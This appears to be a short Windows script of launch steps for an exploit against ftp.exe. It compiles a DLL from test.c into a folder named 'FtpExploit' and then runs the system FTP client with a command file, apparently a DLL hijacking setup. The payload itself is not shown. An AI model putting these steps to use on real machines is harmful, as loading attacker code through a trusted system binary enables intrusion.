"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" x64 

"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe" /nologo /LD "test.c" /link /DEF:"test.def" /OUT:"C:\Temp\FtpExploit\test.dll"

"C:\Windows\System32\ftp.exe" -n -s:"C:\Temp\FtpExploit\ftpcommands.txt"
